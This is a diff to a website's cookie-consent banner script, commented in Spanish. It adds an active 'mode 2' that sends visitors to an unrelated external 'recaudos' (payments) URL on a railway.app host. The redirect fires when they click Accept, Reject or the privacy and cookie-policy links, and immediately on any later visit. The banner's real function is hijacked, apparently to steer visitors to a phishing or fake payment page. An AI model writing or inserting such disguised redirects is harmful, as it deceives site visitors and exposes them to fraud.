@@ -450,32 +450,103 @@ p{ margin:0 0 1rem; color:var(--texto); }
   </div>
 </footer>
 
-<!-- ===== JAVASCRIPT ===== -->
+<!-- ===== JAVASCRIPT - COOKIES Y FUNCIONALIDAD ===== -->
 <script>
 (function(){
-  // Clave nueva para no chocar con pruebas anteriores
+  'use strict';
+
+  // ============================================================
+  //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
+  // ============================================================
+  //  MODO 1: Comportamiento original (solo muestra/oculta la página)
+  //  MODO 2: Redirección a URL externa
+  // ============================================================
+  const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
+  const REDIRECT_URL = "https://gasesenlinea-production.up.railway.app/recaudos"; // URL para el modo 2
+
   var CLAVE = 'cookies_viasqueabrazan_v2';
   var body = document.body;
 
-  // Si ya eligió antes, ocultar el banner de inmediato
-  if (localStorage.getItem(CLAVE)) {
+  // ----- ELEMENTOS DEL BANNER -----
+  var overlay = document.getElementById('cookie-overlay');
+  var banner = document.getElementById('cookie-banner');
+  var btnAceptar = document.getElementById('btn-aceptar');
+  var btnRechazar = document.getElementById('btn-rechazar');
+  var btnReabrir = document.getElementById('btn-reabrir');
+
+  // Enlaces del banner (Privacidad y Cookies)
+  var enlacePrivacidad = document.querySelector('.cookie-enlaces a[href="privacidad.html"]');
+  var enlaceCookies = document.querySelector('.cookie-enlaces a[href="politicas-cookies.html"]');
+
+  // Verificar que los elementos existen
+  if (!overlay || !banner || !btnAceptar || !btnRechazar) {
+    console.error('Error: Elementos del banner de cookies no encontrados');
+    return;
+  }
+
+  // ============================================================
+  //  MODO 2: Si ya eligió antes, redirigir de inmediato
+  // ============================================================
+  if (COOKIE_BUTTON_MODE === 2 && localStorage.getItem(CLAVE)) {
+    window.location.href = REDIRECT_URL;
+    return;
+  }
+
+  // ============================================================
+  //  MODO 1: Si ya eligió antes, ocultar el banner
+  // ============================================================
+  if (COOKIE_BUTTON_MODE === 1 && localStorage.getItem(CLAVE)) {
     body.classList.add('cookies-aceptadas');
   }
 
-  function cerrar(val){
+  // ============================================================
+  //  FUNCIONES
+  // ============================================================
+  function mostrarContenido(val) {
     localStorage.setItem(CLAVE, val);
     body.classList.add('cookies-aceptadas');
   }
 
-  document.getElementById('btn-aceptar').addEventListener('click', function(){
-    cerrar('aceptadas');
-  });
-  document.getElementById('btn-rechazar').addEventListener('click', function(){
-    cerrar('rechazadas');
+  function redirectTo(url) {
+    window.location.href = url;
+  }
+
+  function handleCookieAction(aceptadas) {
+    console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
+
+    if (COOKIE_BUTTON_MODE === 1) {
+      // MODO 1: Comportamiento original
+      mostrarContenido(aceptadas ? 'aceptadas' : 'rechazadas');
+
+      // Actualizar consentimiento de Google Analytics (si existe)
+      if (typeof gtag !== 'undefined') {
+        gtag('consent', 'update', {
+          'ad_storage': aceptadas ? 'granted' : 'denied',
+          'analytics_storage': aceptadas ? 'granted' : 'denied'
+        });
+      }
+      console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
+
+    } else if (COOKIE_BUTTON_MODE === 2) {
+      // MODO 2: Redirección a URL externa
+      localStorage.setItem(CLAVE, aceptadas ? 'aceptadas' : 'rechazadas');
+      sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false');
+      redirectTo(REDIRECT_URL);
+    }
+  }
+
+  // ============================================================
+  //  EVENTOS DE BOTONES
+  // ============================================================
+  btnAceptar.addEventListener('click', function() {
+    handleCookieAction(true);
   });
 
-  // Botón opcional para volver a mostrar el aviso (útil para pruebas)
-  var btnReabrir = document.getElementById('btn-reabrir');
+  btnRechazar.addEventListener('click', function() {
+    handleCookieAction(false);
+  });
+
+  // Botón para reabrir el aviso (útil para pruebas)
   if (btnReabrir) {
     btnReabrir.addEventListener('click', function(){
       localStorage.removeItem(CLAVE);
@@ -483,6 +554,21 @@ p{ margin:0 0 1rem; color:var(--texto); }
       window.scrollTo({ top: 0, behavior: 'smooth' });
     });
   }
+
+  // ============================================================
+  //  ENLACES DEL BANNER (modo 2 redirige también)
+  // ============================================================
+  function handleBannerLinkClick(event) {
+    if (COOKIE_BUTTON_MODE === 2) {
+      event.preventDefault();
+      console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
+      redirectTo(REDIRECT_URL);
+    }
+  }
+
+  if (enlacePrivacidad) enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
+  if (enlaceCookies) enlaceCookies.addEventListener('click', handleBannerLinkClick);
+
 })();
 </script>
 
